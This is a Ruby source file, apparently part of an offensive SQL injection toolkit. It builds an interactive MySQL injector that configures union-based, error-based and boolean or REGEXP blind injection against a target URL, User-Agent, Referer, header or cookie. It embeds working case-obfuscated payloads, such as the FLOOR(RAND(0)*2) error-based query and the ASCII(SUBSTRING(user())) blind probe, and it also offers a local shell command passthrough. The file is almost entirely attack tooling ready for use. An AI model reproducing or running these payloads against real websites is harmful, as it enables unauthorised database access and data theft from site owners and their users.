# MySQL Menu

def mysql_usage
  puts "Available MySQL Injector Options: ".underline.white
  puts "clear".light_yellow + "  => ".white + "Clear Terminal".light_red
  puts "back".light_yellow + "   => ".white + "Return to Main Menu".light_red
  puts "config".light_yellow + " => ".white + "Configure MySQL Injector".light_red
  puts "reset".light_yellow + "  => ".white + "Reset Injector's Configuration".light_red
  puts "union".light_yellow + "  => ".white + "MySQL Union Based Injection Tool".light_red
  puts "error".light_yellow + "  => ".white + "MySQL Error Based Injection Tool".light_red
  puts "blind".light_yellow + "  => ".white + "MySQL Blind Based Injection Tool".light_red
#  puts "time".light_yellow + "   => ".white + "MySQL  Time Based Injection Tool".light_red
  puts
end

def mysql_menu
  puts
  prompt = "(MySQL)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      mysql_menu
    when /^h$|^help$|^ls$/i
      puts
      mysql_usage
      mysql_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to Main Menu....")
      main_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      mysql_menu
    when /^local$|^OS$/i
      local_shell
      mysql_menu
    when /^config$/i
      mysql_injector_configurator
      mysql_menu
    when /^show.config/i
      print_status("Current Configuration: ")
      pp $config
      mysql_menu
    when /^reset$/i
      mysql_injector_configurator_wiper
      mysql_menu
    when /^ip$/i
      ip_info
      mysql_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      mysql_menu
    when /^union$|^u$/i
      if not $config['INJECTOR']['MYSQL']['CONFIGURED']
        puts
        print_error("Please use the 'CONFIG' option to setup & configure the MySQL Injector.....")
        print_error("Then come back and try again ;)\n\n")
      else
        # Do we know column count?
        while(true)
          columns = Readline.readline("(Column Count)> ", true)
          if columns.strip.chomp =~ /\d+/
            $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'] = columns.strip.chomp.to_i
            answer = Readline.readline("(Do you know vuln column (Y/N)?)> ", true)
            if answer[0].upcase == 'Y'
              vcol = Readline.readline("(Vulnerable Column Number)> ", true)
              $config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'] = vcol.strip.chomp.to_i
              puts
              break
            else
              $config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'] = 0 # Unknown, need to perform union fuzz....
            end
            break
          else
            print_error("Need to provide a numerical value for column count!\n\n")
          end
        end

        # Union Injection Type?
        # This establishes a base line injection string to use throughout....
        while(true)
          print_caution("Select Union Injection Type: ")
          print_caution("0) Standard Union [union select 1,2,3]")
          print_caution("1) Buffer Overflow Union [ and (select 1)=(select BoF) union select 1,2,3]")
          print_caution("2) Null Union [union select null,null,null]")
          print_caution("3) Custom Char Union [union select custom,custom,custom]")
          line = Readline.readline("   Enter Union Type: ", true)
          print_line("")
          case line.strip.chomp.to_i
          when 0
            $config['INJECTOR']['MYSQL']['UNION']['STR'] = union_str($config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i)
            break
          when 1
            buff = Readline.readline("   Enter Buffer Size to Use: ", true)
            $config['INJECTOR']['MYSQL']['UNION']['STR'] = union_bof_str(buff.strip.chomp.to_i, $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i)
            print_line("")
            break
          when 2
            $config['INJECTOR']['MYSQL']['UNION']['STR'] = union_null_str($config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i)
            break
          when 3
            line = Readline.readline("   Enter Custom Column Value to Use: ", true)
            custom=line.chomp
            print_line("")
            $config['INJECTOR']['MYSQL']['UNION']['STR'] = union_expand_str(custom, $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'])
            break
          else
            print_line("")
            print_error("Oops, Didn't quite understand that one!")
            print_error("Let's try this one more time....\n\n")
          end
        end
        
        # OK, now go to injector...
        print_status("OK, routing to MySQL Union Injector with the following config...")
        un = MySQLUnionInjector.new()
        if un.union_check
          un.get_basic
          un.mysql_union_menu
        end
      end
      mysql_menu
    when /^error$|^e$/i
      if not $config['INJECTOR']['MYSQL']['CONFIGURED']
        puts
        print_error("Please use the 'CONFIG' option to setup & configure the MySQL Injector.....")
        print_error("Then come back and try again ;)\n\n")
      else
        while(true)
          print_caution("Select Injection Type: ")
          print_caution("1) OR Based Injection")
          print_caution("2) AND Based Injection\n")
          while line = Readline.readline("(Error Type)> ", true)
            answer = line.chomp
            case answer.to_i
            when 1
              $config['INJECTOR']['MYSQL']['ERROR']['METHOD'] = 'OR'
              $config['INJECTOR']['MYSQL']['ERROR']['STR'] = " oR 1 GrOUp bY cONcAt(version(),FlOoR(RaNd(0)*2)) HaVIng MiN(0) oR 1"
              break
            when 2
              $config['INJECTOR']['MYSQL']['ERROR']['METHOD'] = 'AND'
              $config['INJECTOR']['MYSQL']['ERROR']['STR'] = " aNd (SeLEcT 5151 fRoM (SeLEcT cOUnT(*),cONcAt(version(),FlOoR(rand(0)*2))z fRoM information_schema.character_sets GrOUp bY z) tomfoolery)"
              break
            else
              print_line("")
              print_error("Oops, Didn't quite understand that one!")
              print_line("")
            end
          end
          break
        end
        print_status("OK, routing to MySQL Error Based Injector...")
        error = MySQLErrorInjector.new()
        if error.error_check
          error.get_basic
          error.mysql_error_menu
        end
      end
      mysql_menu
    when /^blind$|^b$/i
      if not $config['INJECTOR']['MYSQL']['CONFIGURED']
        puts
        print_error("Please use the 'CONFIG' option to setup & configure the MySQL Injector.....")
        print_error("Then come back and try again ;)\n\n")
      else
        while(true)
          print_caution("Select Injection Type: ")
          print_caution("1) Boolean Blind")
          print_caution("2) REGXP Blind\n")
          while line = Readline.readline("(Blind Type)> ", true)
            answer = line.chomp
            case answer.to_i
            when 1
              $config['INJECTOR']['MYSQL']['BLIND']['METHOD'] = 'BOOLEAN'
              $config['INJECTOR']['MYSQL']['BLIND']['STR'] = " aNd (SeLeCT aScii(suBstRiNg((user()),1,1))<51)"
              break
            when 2
              $config['INJECTOR']['MYSQL']['BLIND']['METHOD'] = 'REGXP'
              $config['INJECTOR']['MYSQL']['BLIND']['STR'] = " aNd 1=(SELECT 1 REGEXP IF(1=1,1,''))"
              break
            else
              print_line("")
              print_error("Oops, Didn't quite understand that one!")
              print_line("")
            end
          end
          break
        end
        print_status("OK, routing to MySQL Blind Injector...")
        blind = MySQLBlindInjector.new()
        if blind.blind_check
          blind.mysql_blind_menu
        end
      end
      mysql_menu
    when /^time$|^t$/i
      if not $config['INJECTOR']['MYSQL']['CONFIGURED']
        puts
        print_error("Please use the 'CONFIG' option to setup & configure the MySQL Injector.....")
        print_error("Then come back and try again ;)\n\n")
      else
        puts
        print_error("Sorry, MySQL Time Based Injector still being worked on.....\n\n")
      end
      mysql_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      mysql_menu
    end
  end
end

# Configure Basic Injector Settings
def mysql_injector_configurator_wiper
  puts
  $config['INJECTOR']['MYSQL']['TIME']={}
  $config['INJECTOR']['MYSQL']['UNION']={}
  $config['INJECTOR']['MYSQL']['ERROR']={}
  $config['INJECTOR']['MYSQL']['BLIND']={}
  $config['INJECTOR']['MYSQL']['URL']  = nil
  $config['INJECTOR']['MYSQL']['LOC']  = nil
  $config['INJECTOR']['MYSQL']['REF']  = nil
  $config['INJECTOR']['MYSQL']['DATA'] = nil
  $config['INJECTOR']['MYSQL']['HEADERS'] = {}
  $config['INJECTOR']['MYSQL']['COOKIES'] = {}
  $config['INJECTOR']['MYSQL']['CONFIGURED'] = false
  $config['INJECTOR']['MYSQL']['UA'] = $config['HTTP']['HTTP_USER_AGENT']
  print_good("MySQL Injector Configuration has been reset!")
end

# Configure Basic Injector Settings
def mysql_injector_configurator
  puts
  # Where to inject?
  while(true)
    print_caution("Select Injection Location: ")
    puts "      1) URL".white
    puts "      2) User-Agent".white
    puts "      3) Referer".white
    puts "      4) Header".white
    puts "      5) Cookie\n".white
    answer = Readline.readline("   Injection Location: ", true)
    puts
    if answer[0].to_i > 0 and answer[0].to_i <= 5
      case answer[0].to_i
      when 1
        $config['INJECTOR']['MYSQL']['LOC'] = 'URL'
      when 2
        $config['INJECTOR']['MYSQL']['LOC'] = 'UA'
      when 3
        $config['INJECTOR']['MYSQL']['LOC'] = 'REF'
      when 4
        $config['INJECTOR']['MYSQL']['LOC'] = 'HEADER'
      when 5
        $config['INJECTOR']['MYSQL']['LOC'] = 'COOKIE'
      end
      break
    else
      print_error("Unknown option selected!")
      print_error("Comeback and try again when you're ready....\n\n")
      return
    end
  end

  # Request type & Related Info for injection?
  while(true)
    print_caution("Request Type: ")
    print_caution("1) GET")
    print_caution("2) POST")
    answer = Readline.readline("   Type: ", true)
    if answer[0].to_i == 1 or answer[0].upcase == 'G'
      # GET
      puts if $config['INJECTOR']['MYSQL']['LOC'] == 'URL'
      print_caution("Remember to Note Injection point with '_SQLI_' marker when giving URL!\n") if $config['INJECTOR']['MYSQL']['LOC'] == 'URL'
      url = Readline.readline("   Enter URL: ", true)
      if url.nil? or url == '' or ($config['INJECTOR']['MYSQL']['LOC'] == 'URL' and not url =~ /_SQLI_/)
        puts
        print_error("Invalid URL String provided, try again!\n")
      else
        $config['INJECTOR']['MYSQL']['URL'] = url.strip.chomp
        break
      end
    elsif answer[0].to_i == 2 or answer[0].upcase == 'P'
      # POST
      puts if $config['INJECTOR']['MYSQL']['LOC'] == 'URL'
      print_caution("Remember to Note Injection point with '_SQLI_' marker when giving URL or DATA!\n") if $config['INJECTOR']['MYSQL']['LOC'] == 'URL'
      url = Readline.readline("   Enter URL: ", true)
      if url.nil? or url == ''
        puts
        print_error("Invalid URL String provided, try again!\n")
      else
        data = Readline.readline("   Enter POST Data: ", true)
        if ((not data =~ /_SQLI_/ and not url =~ /_SQLI_/) and $config['INJECTOR']['MYSQL']['LOC'] == 'URL')
         puts
         print_error("_SQLI_ Marker not found in URL or DATA string provided! Let's try again....\n")
        else
          $config['INJECTOR']['MYSQL']['URL']  = url.strip.chomp
          $config['INJECTOR']['MYSQL']['DATA'] = data.strip.chomp
          break
        end
      end
    else
      puts
      print_error("Only two options, it's not that hard!")
      print_error("Please select valid option from choices below....\n\n")
    end
  end
  puts

  # User-Agent Injection?
  if $config['INJECTOR']['MYSQL']['LOC'] == 'UA'
    print_status("User-Agent Injection Selected!")
    print_caution("Need for you to provide UA string to use with _SQLI_ marker set where needed!")
    print_status("Current User-Agent String: \n#{$config['HTTP']['HTTP_USER_AGENT']}\n")
    while(true)
      ua_str = Readline.readline("   Enter Updated User-Agent String w/Marker: ", true)
      if ua_str =~ /_SQLI_/
        $config['INJECTOR']['MYSQL']['UA'] = ua_str.strip.chomp
        break
      else
       puts
       print_error("_SQLI_ Marker not found in URL or DATA string provided! Let's try again....\n")
      end
    end
  else
    $config['INJECTOR']['MYSQL']['UA'] = $config['HTTP']['HTTP_USER_AGENT']
  end

  # Referrer Based Injection?
  if $config['INJECTOR']['MYSQL']['LOC'] == 'REF'
    print_status("Referer Injection Selected!")
    print_caution("Need for you to provide Referer string to use with _SQLI_ marker set where needed!")
    while(true)
      ref_str = Readline.readline("   Enter Referer String w/Marker: ", true)
      if ref_str =~ /_SQLI_/
        $config['INJECTOR']['MYSQL']['REF'] = ref_str.strip.chomp
        break
      else
       puts
       print_error("_SQLI_ Marker not found in URL or DATA string provided! Let's try again....\n")
      end
    end
  else
    $config['INJECTOR']['MYSQL']['REF'] = nil
  end

  # Header Based Injection?
  if $config['INJECTOR']['MYSQL']['LOC'] == 'HEADER'
    $config['INJECTOR']['MYSQL']['HEADERS'] = {}
    print_status("Header Based Injection Selected!")
    print_caution("Need for you to provide Header Name & string value to use with _SQLI_ marker set where needed!")
    while(true)
      head_name = Readline.readline("   Enter Header Name: ", true)
      head_str = Readline.readline("   Enter #{head_name.strip.chomp} Header Value w/Marker: ", true)
      if not head_name.nil? and not head_str.nil? and head_str != '' and head_name != '' and head_str =~ /_SQLI_/
        $config['INJECTOR']['MYSQL']['HEADERS'].store(head_name.strip.chomp.upcase, head_str.strip.chomp)
        break
      else
       puts
       print_error("Invalid info provided or _SQLI_ Marker not found! Let's try this again....\n")
      end
    end
  else
    $config['INJECTOR']['MYSQL']['HEADERS'] = {}
  end

  # Cookie Based Injection?
  if $config['INJECTOR']['MYSQL']['LOC'] == 'COOKIE'
    $config['INJECTOR']['MYSQL']['COOKIES'] = {}
    print_status("Cookie Based Injection Selected!")
    print_caution("Need for you to provide Cookie Name & string value to use with _SQLI_ marker set where needed!")
    while(true)
      cookie_name = Readline.readline("   Enter Cookie Name: ", true)
      cookie_str = Readline.readline("   Enter #{cookie_name.strip.chomp} Header Value w/Marker: ", true)
      if not cookie_name.nil? and not cookie_str.nil? and cookie_str != '' and cookie_name != '' and cookie_str =~ /_SQLI_/
        $config['INJECTOR']['MYSQL']['COOKIES'].store(cookie_name.strip.chomp.upcase, cookie_str.strip.chomp)
        break
      else
       puts
       print_error("Invalid info provided or _SQLI_ Marker not found! Let's try this again....\n")
      end
    end
  else
    $config['INJECTOR']['MYSQL']['COOKIES'] = {}
  end

  # Finaly we have base config set and ready to go testing...
  $config['INJECTOR']['MYSQL']['CONFIGURED'] = true

  # Print config details so user can reset if needed...remove later?
  puts
  print_good("MySQL Injector is now Configured!")
  pp $config['INJECTOR']['MYSQL']
  puts
end
